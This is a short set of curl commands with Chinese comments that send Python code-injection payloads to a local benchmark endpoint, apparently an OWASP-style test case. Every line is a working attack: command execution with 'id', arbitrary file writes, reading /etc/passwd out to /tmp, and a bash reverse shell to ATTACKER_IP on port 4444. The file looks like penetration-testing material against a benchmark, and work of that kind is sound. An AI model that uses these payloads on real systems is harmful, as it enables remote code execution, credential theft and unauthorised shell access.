# 基础 RCE（无回显，通过副作用确认）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
  -d 'BenchmarkTest00160=__import__("os").system("id > /tmp/cmd_out")'

# 文件写入（可写任意内容到文件）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
  -d 'BenchmarkTest00160=open("/tmp/evil","w").write("pwned")'

# 文件读取（外带到可读路径）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
  -d 'BenchmarkTest00160=open("/tmp/exfil","w").write(__import__("os").popen("cat /etc/passwd").read())'

# 反向 Shell 命令
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
  -d 'BenchmarkTest00160=__import__("os").system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"")'